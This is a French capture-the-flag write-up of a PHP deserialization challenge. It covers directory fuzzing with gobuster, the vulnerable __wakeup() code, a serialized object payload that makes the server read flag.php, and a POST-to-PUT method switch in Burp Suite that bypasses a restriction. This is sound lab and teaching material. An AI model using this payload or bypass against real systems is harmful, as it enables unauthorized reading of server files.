# CTF Writeup : PHP Deserialization & Upload Bypass

## 🎯 Objectif
Exploiter une vulnérabilité de désérialisation PHP via un formulaire d'upload pour lire un fichier sensible (le flag), en contournant les restrictions de méthode HTTP.

## 🛠️ Outils
* **Gobuster** : Enumération de fichiers/dossiers.
* **Burp Suite** : Interception et manipulation de requêtes.
* **PHP** : Compréhension du code source vulnérable.

---

## 1. Reconnaissance (Fuzzing)
Localiser le script d'upload caché en cherchant spécifiquement les extensions `.php`.

**Commande :**
```bash
gobuster dir -u http://web0x0a.task4.hbtn/ -w /usr/share/wordlists/dirb/common.txt -x php
```

**Résultat :** Découverte de `/upload.php` (Status 200).

---

## 2. Analyse de la Vulnérabilité
Le code source utilise la méthode magique `__wakeup()` de PHP lors de la désérialisation.

**Code vulnérable :**
```php
public function __wakeup() {
    // Faille : file_get_contents lit le chemin défini dans l'objet sans vérification
    $this->cover_image = file_get_contents($this->cover_path);
}
```

Si l'on injecte un objet sérialisé avec `cover_path` pointant vers le flag, le serveur lira le flag.

---

## 3. Préparation de l'Exploit (Payload)
Création du fichier `exploit.txt` contenant l'objet `Book` malveillant sérialisé.

**Payload :**
```plaintext
O:4:"Book":4:{s:5:"title";s:14:"Exploited Book";s:6:"author";s:8:"Attacker";s:10:"cover_path";s:22:"/var/www/html/flag.php";s:11:"cover_image";N;}
```

**Cible :** `/var/www/html/flag.php`

---

## 4. Exploitation (Burp Suite)
Le serveur bloque probablement les requêtes POST classiques sur ce script. Il faut "masquer" l'envoi.

1. **Action :** Tenter d'uploader `exploit.txt` via le navigateur sur `/upload.php`.
2. **Interception :** Bloquer la requête dans Burp Proxy.
3. **Contournement (Bypass) :**
   - Clic droit sur la requête > **Change request method**.
   - La méthode passe de `POST` à `PUT`.
4. **Envoi :** Cliquer sur **Forward**.

---

## 5. Résultat
Analyser la réponse HTTP dans l'onglet **HTTP History**. Le contenu du fichier `/flag.php` est affiché dans la réponse du serveur (désérialisation réussie).
